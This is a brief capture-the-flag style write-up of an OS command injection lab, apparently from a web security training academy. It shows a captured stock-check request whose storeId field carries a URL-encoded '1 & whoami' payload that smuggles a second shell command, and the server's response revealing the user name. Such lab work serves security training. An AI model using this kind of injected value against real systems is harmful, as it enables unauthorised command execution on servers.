# Lab - 01

Topic :  OS command injection, simple case

Concept:  Doing a simple command injection

End Goal : Command Injection

Analysis : 

- It’s already given that the vuln is in the stock check feature
- First of all we fetch the burp request

```
POST /product/stock HTTP/2
Host: 0aed000904789614813207cc003500e5.web-security-academy.net
Cookie: session=PJ0idMrpQ5s4AQehOVwS7xGUG7Z4pF2q
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aed000904789614813207cc003500e5.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: https://0aed000904789614813207cc003500e5.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

productId=2&storeId=1%20%26%20whoami
```

- We fuzz the storeId parameter with url encoded `1 & whoami` [url encoded].
- Output

```
HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

peter-C7K1gv
32
```